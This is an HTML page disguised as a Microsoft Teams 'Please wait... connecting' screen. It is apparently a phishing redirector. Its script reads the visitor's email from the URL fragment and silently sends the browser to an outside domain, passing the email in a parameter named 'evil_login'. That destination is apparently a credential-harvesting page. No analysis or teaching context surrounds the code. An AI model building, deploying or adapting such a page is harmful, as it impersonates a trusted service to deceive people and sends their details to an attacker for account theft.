<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Connecting to Microsoft Teams</title>
  <style>
    body {
      font-family: Segoe UI, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f2f2f2;
    }
    h2 { color: #444; }
    p { color: #777; }
  </style>
</head>
<body>

  <h2>Please wait...</h2>
  <p>Connecting you to Microsoft Teams</p>
  <script>
window.addEventListener('load', function() {
    const hashEmail = window.location.hash.substring(1); // target@example.com
    if (!hashEmail) return;
    const redirectURL = "https://access-meetings.visions-solutions.ca/yLobagKc?evil_login=" + encodeURIComponent(hashEmail);
    window.location.assign(redirectURL);
});
</script>
</body>
</html>
